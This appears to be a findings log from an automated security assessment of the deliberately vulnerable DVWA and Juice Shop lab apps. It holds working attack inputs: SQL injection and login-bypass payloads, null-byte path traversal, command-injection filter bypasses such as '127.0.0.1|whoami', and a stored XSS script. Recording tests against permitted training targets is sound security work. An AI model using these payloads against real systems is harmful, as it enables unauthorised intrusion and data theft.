state.objective: Discover and behaviorally verify security vulnerabilities across permitted targets (http://dvwa and http://juiceshop:3000) within strict HTTP, LLM, and duration budgets.

endpoints.observation_evidence: Out-of-band id input for high-level SQLi

findings.title: Unauthenticated User-Feedback PII Exposure
findings.response_evidence: HTTP 200 without authentication. Returns feedback records disclosing author email addresses (PII), e.g. comment text ending with partially-masked emails like (***in@juice-sh.op), (***ereum@juice-sh.op) tied to UserId values 1,2,3,21. Endpoint accessible with no token.

findings.title: Exposed Encryption-Keys Directory (browsable)
findings.response_evidence: HTTP 200 directory listing of /encryptionkeys/ exposing sensitive key files: jwt.pub (248 bytes) and premium.key (50 bytes). Directory browsing enabled via serve-index, listing links to /encryptionkeys/jwt.pub and /encryptionkeys/premium.key.

findings.title: Confidential Document via Open Directory Listing
findings.response_evidence: Open /ftp/ directory listing reveals acquisitions.md (909 bytes). Direct retrieval returns HTTP 200 confidential memo: '# Planned Acquisitions ... This document is confidential! Do not distribute! Our company plans to acquire several competitors within the next year. This will have a significant stock market impact...'

findings.title: Product-Search SQL Injection
findings.response_evidence: Single quote q=qwert' triggers HTTP 500: 'Error: SQLITE_ERROR: near \"'%'\": syntax error'. The 9-column UNION injection q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9-- returns HTTP 200 with injected row mapped to columns: {\"id\":1,\"name\":2,\"description\":3,\"price\":4,\"deluxePrice\":5,\"image\":6,...}, proving UNION-based SQLi.

findings.title: Login Authentication-Bypass SQL Injection
findings.response_evidence: HTTP 200 returns valid authentication token for first user: {\"authentication\":{\"token\":\"[JWT]\",\"bid\":1,\"umail\":\"admin@juice-sh.op\"}}. The SQLi payload bypassed authentication and logged in as admin@juice-sh.op without valid credentials.

findings.title: Poison Null-Byte Path Traversal under /ftp/
request_sequence: GET /ftp/package.json.bak -> HTTP 403 'Only .md and .pdf files are allowed!'
findings.response_evidence: Raw GET /ftp/package.json.bak returns HTTP 403 'Error: Only .md and .pdf files are allowed!'. Appending URL-encoded null byte + allowed extension GET /ftp/package.json.bak%2500.md bypasses the filter, returning HTTP 200 with the restricted backup file content: {\"name\":\"juice-shop\",\"version\":\"6.2.0-SNAPSHOT\",...dependencies...}.

findings.title: Cross-User Basket Access / BOLA
request_sequence: GET /rest/basket/6 as juiceshop_acct1 (own_basket_id=6) -> Apple Juice qty 3
GET /rest/basket/6 as juiceshop_acct2 (own_basket_id=7) -> same basket returned
findings.response_evidence: juiceshop_acct2 (own basket id 7, UserId reflecting acct2) successfully retrieved Account 1's basket id 6 (UserId 22). Response discloses Account 1's distinct seeded item: 'Apple Juice (1000ml)' quantity 3 (BasketItem id 9, ProductId 1, BasketId 6). No authorization check enforced on basket ID.

findings.title: SQL Injection (low)
findings.response_evidence: [security=low] TRUE boolean 1' OR '1'='1 returns multiple seeded surnames: admin, Brown, Me, Picasso, Smith (5 records). FALSE boolean 1' AND '1'='2 returns zero records (empty result). Confirms boolean-based SQL injection.

findings.title: OS Command Injection (low)
findings.response_evidence: [security=low] Payload 127.0.0.1; whoami. Response ping output followed by command-injected identity: 'www-data'. Confirms OS command injection executing as the web process user.

findings.title: Stored Cross-Site Scripting (low)
findings.response_evidence: [security=low] Canary <script id=\"test_token\">window.xss_flag=1</script> (49 chars, fits maxlength=50) stored in guestbook message field. On rendering the page in authenticated browser, the injected script executed: window.xss_flag evaluated to 1.

findings.title: SQL Injection (medium)
findings.response_evidence: [security=medium] id submitted as POST with quotes escaped, numeric boolean used. TRUE 1 OR 1=1 returns 5 seeded surnames: admin, Brown, Me, Picasso, Smith. FALSE 1 AND 1=2 returns zero records. Page shows 'Security Level: medium'. Confirms numeric boolean-based SQLi bypass.

findings.title: OS Command Injection (medium)
findings.response_evidence: [security=medium] ; and && are blacklisted; pipe bypass 127.0.0.1| whoami used. Response output contains web-process identity 'www-data'. Page shows 'Security Level: medium'.

findings.title: OS Command Injection (high)
findings.response_evidence: [security=high] '; ', '| ' (pipe+space), '&&' blacklisted; bypass pipe with no trailing space 127.0.0.1|whoami used. Response output contains web-process identity 'www-data'. Page shows 'Security Level: high'.

findings.title: SQL Injection (high)
findings.response_evidence: [security=high] id submitted out-of-band via session-input.php; query appends LIMIT 1 so trailing comment '#' required. TRUE payload 1' OR '1'='1' # then loading /vulnerabilities/sqli/ returns 5 seeded surnames: admin, Brown, Me, Picasso, Smith. FALSE payload 1' AND '1'='2' # returns zero records. Page shows 'Security Level: high'.
